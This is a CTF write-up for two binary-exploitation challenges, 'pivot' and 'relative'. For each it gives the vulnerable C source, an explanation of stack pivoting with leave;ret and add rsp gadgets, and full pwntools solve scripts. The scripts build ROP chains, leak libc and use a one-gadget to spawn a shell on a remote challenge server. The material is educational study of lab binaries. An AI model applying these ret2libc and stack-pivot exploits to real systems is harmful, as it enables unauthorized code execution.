+++
title = "Week 04"
weight = 3
slug="week-04"
description = "- pivot: stack pivoting, the address of user input is leaked and leave;ret instructions are used to get to ropchain<br>- relative: stack pivoting by using add rsp instructions"
+++

This was the first week where things were pretty difficult for me. I will add writeups to these ones for sure, still barely understand how I did these.

# pivot
Stack pivoting, the address of your input is leaked, and you can use leave; ret to jump to it. From there it's a ret2libc.

We are given source code:
``` C
#include <stdio.h>
void vuln() {
	char buf[8];
	fgets(buf, 24, stdin);
}


void query() {
	malloc(4096 * 4);
	printf("whats you're name?\n");
	char* name = malloc(256);
	fgets(name, 256, stdin);
	printf("nice to meet you %s!  i left your name tag at 0x%lx\n", name, name);
	vuln();
}

void main() {
	setvbuf(stdout, 0, _IONBF,0);
	setvbuf(stdin, 0, _IONBF,0);
	setvbuf(stderr, 0, _IONBF,0);
	query();
}
```

We get to write 255 bytes (because fgets reads one less than size), and then are given the address of the buffer. Next is a vuln function which consists of 8 bytes of buffer and then 15 more bytes (remember because fgets reads size-1, this took me ages to bug fix when I sent 24 bytes and was confused when my subsequent writes were all off by one byte.) This vuln is just enough to overwrite rbp and rip, but not enough to add anything after it. Luckily, this is enough since we can set rbp to point to our leaked input from query(). Then, we overwrite rip to jump to a leave ret instruction which will load our ropchain from our query write. The following is an explanation that will hopefully clear things up, but it IS a very confusing thing at first, so don't feel bad if you're confused.

First, we need to understand how leave works. Essentially leave is the same as 
``` asm
mov rbp, rsp
pop rbp
```

What this means is that the value in rbp is moved to rsp, and the next 8 bytes are popped from the "stack" (wherever rsp is now pointing) into rbp. Let's break down our exploit a bit more now that we understand how leave works.

First, we write 8 bytes of whatever and then our ROPchain into query. So our name buffer will look like this:
```
name = "AAAAAAAA" + ropchain
```

Then we go into vuln, where we overwrite rbp to be the address of name, and rip to point to a leave ret gadget. Now, when we get to the end of the vuln function, right before the leave ret, our registers will look like
```
rsp = some real stack address
rbp = some real stack address, which points to the address of our name
```

Then, when the leave is executed, our registers will look like
```
rsp = some real stack address+ 8 (because the first 8 bytes are popped into rbp
rbp = address of name buffer
```

So now, the ret will execute, and we will jump to the leave ret gadget. When that leave executes, our registers will look like
```
rsp = address of name buffer+8
rbp = "AAAAAAAA"
rip = first address in our ROPchain
```
and then the ROP chain will execute. As you can see, the first 8 bytes of our name buffer are actually loaded into rbp, so we should set that to some address with read and write permissions so things don't break in-between.

So we have a way of executing a ROPchain, we can just do a ret2libc using this method.


Solve script:
``` py
#!/usr/bin/env python3

from pwn import *

exe = ELF("./pivot_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        gdb.attach(r)
    else:
        r = remote("128.199.12.141", 7011)

    return r


def main():
    r = conn()

    # good luck pwning :)

    rbp_val = p64(0x3ff000)
    rdi_ret = p64(0x4012bb)
    leave_ret = p64(0x401183)
    puts_got = p64(exe.got['puts'])
    puts_plt = p64(exe.plt['puts'])
    query = p64(exe.sym['query'])

    payload = rbp_val + rdi_ret + puts_got + puts_plt + query
    
    print(r.recvline())
    # sending the payload to the first query()
    r.sendline(payload)
    name = r.recvline().strip().split()[-1]
    name = p64(int(name, 16))
    print('name:', name)
    # send to first vuln()
    r.send(b'B'*8 + name + leave_ret[:-1])

    leak = r.recvline()
    base = u64(leak.rstrip().ljust(8, b'\x00')) - libc.symbols['puts']

    onegadget = p64(base + 0x4484f)
    zero_rax = p64(base + 0x980f5)

    print(r.recvline())
    r.sendline(b'C'*8 + zero_rax + onegadget)
    name2 = r.recvline().strip().split()[-1]
    name2 = p64(int(name2, 16))
    print('name2:', name2)

    r.send(b'D'*8 + name2 + leave_ret)

    r.interactive()


if __name__ == "__main__":
    main()
```

# relative
Stack pivoting by using add rsp instructions. The add rsp, 8 instruction conveniently makes it so it returns directly onto our input.

We are given source code:
``` C
#include <stdio.h>
#include <stdlib.h>


void gadgets() {
	asm("add $8, %rsp;");
}

void main() {
	setvbuf(stdout, 0, _IONBF,0);
	setvbuf(stdin, 0, _IONBF,0);
	setvbuf(stderr, 0, _IONBF,0);
	puts("hi lol");
	char buf[8 * 4];
	void (*exit_cached)(int, int, int);
	exit_cached = exit;
	fgets(buf, 8 * 6, stdin);
	exit_cached(1,2,3);
	return 1;
}
```

We have a buffer overflow clearly, but not much else to work with. We can overwrite the value of exit_cached to call a function, so I first experimented with calling a bunch of different things like main and puts, but eventually I noticed that if you overwrite exit_cached to call the add rsp, 8 instruction, it moves rsp to the address of your input, which means when it tries to ret from gadget, it pops the first 8 bytes of your input into rip. So this means we can write a ROPchain into our input and overwrite exit_cached with the gadget to load the ROPchain. From here, I just used a ROPchain to leak libc and then jumped back to main. The next input is different since it segfaults in a different place. Luckily, it is still somewhere we control the value of, so we can just modify the size of our buffer to jump to another ROPchain and win.

Solve script:
``` py
#!/usr/bin/env python3

from pwn import *

exe = ELF("./relative_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        gdb.attach(r)
    else:
        r = remote("128.199.12.141", 7012)

    return r

def main():
    r = conn()

    # good luck pwning :)
    BUFSIZE = 40
    rdi_ret = p64(0x40125b)
    puts_plt = p64(exe.plt['puts'])
    puts_got = p64(exe.got['puts'])
    main = p64(0x4011af)
    add_rsp_8 = p64(0x401012)[:-1]

    # only 7 bytes remaining, msb must be 0x00. Not much of an issue b/c all addresses can be specified in 7 bytes    

    payload = rdi_ret + puts_got + puts_plt + main
    payload += b'A'*(BUFSIZE-len(payload))

    r.recvline()
    r.send(payload + add_rsp_8)

    leak = r.recvline()
    base = u64(leak.rstrip().ljust(8, b'\x00')) - libc.symbols['puts']

    onegadget = p64(base+0x4484f)
    zero_rax = p64(base+0x0980f5)

    payload2 = b'B'*24 + zero_rax + onegadget

    r.sendline(payload2)

    r.interactive()


if __name__ == "__main__":
    main()
```
